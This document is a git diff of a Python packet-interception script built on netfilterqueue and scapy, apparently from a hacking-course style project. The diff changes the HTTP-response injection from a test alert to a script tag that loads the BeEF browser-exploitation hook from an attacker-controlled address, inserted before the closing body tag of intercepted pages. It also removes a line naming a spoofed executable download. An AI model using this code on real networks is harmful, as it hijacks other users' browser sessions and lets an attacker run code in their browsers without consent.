@@ -6,7 +6,6 @@ import re
 
 def main():
     # TODO make below an argparse input
-    spoof_file = 'https://www.rarlab.com/rar/wrar56b1.exe'
     #setup_iptables()
     try:
         queue = netfilterqueue.NetfilterQueue()
@@ -48,7 +47,9 @@ def process_packet(packet):
             # Looks for reseponses on HTML port by looking at source port variable
             elif scapy_packet[scapy.TCP].sport == 80:
                 print('[+] Response:')
-                injection_code = '<script>alert("test");</script>'
+                # This application is used to inject BeEF. Replace the IP with your machine's IP
+                    # TODO automate this with argparse
+                injection_code = '<script src="http://127.0.0.1:3000/hook.js"></script>'
                 # Looks for the end of HTML code and inserts our script
                 load = load.replace('</body>', f'{injection_code}</body>')
                 # Looks if there is a content length variable that needs to be changed
